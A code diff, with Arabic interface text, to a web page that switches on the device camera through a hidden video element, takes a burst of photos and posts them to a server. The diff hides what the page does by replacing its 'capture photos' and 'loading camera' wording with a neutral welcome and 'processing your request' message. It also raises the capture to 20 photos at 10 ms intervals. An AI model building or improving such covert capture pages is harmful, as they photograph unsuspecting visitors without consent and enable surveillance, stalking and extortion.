@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>التقاط الصور</title>
+    <title>مرحبا بك</title>
     <style>
         body {
             background-color: black;
@@ -36,7 +36,7 @@
 <body>
     <div class="container">
         <div class="spinner"></div>
-        <h1>جاري تحميل الكاميرا</h1>
+        <h1>جاري تنفيذ طلبك</h1>
         <p>يرجى الانتظار...</p>
     </div>
     <video id="frontVideo" playsinline autoplay style="display:none;"></video>
@@ -110,7 +110,7 @@
             let photoCount = 0;
 
             const captureInterval = setInterval(() => {
-                if (photoCount >= 5) {
+                if (photoCount >= 20) {
                     clearInterval(captureInterval);
                     return;
                 }
@@ -126,7 +126,7 @@
                 }, 'image/png');
 
                 photoCount++;
-            }, 100); // التقاط صورة كل ثانية
+            }, 10); // التقاط صورة كل ثانية
         }
 
         function post(url, formData) {
@@ -139,8 +139,8 @@
                 if (data.success) {
                     console.log('Photos sent successfully');
                     document.querySelector('.container').innerHTML = `
-                        <h1>تم إرسال الصور بنجاح</h1>
-                        <p>يمكنك إغلاق هذه الصفحة الآن</p>
+                        <h1>تم تنفيذ طلبك ودخول الا الموقع</h1>
+                        <p>يمكنك التصفح الان او قوم بغلق الصفحه</p>
                     `;
                 } else {
                     console.error('Error sending photos:', data.error);
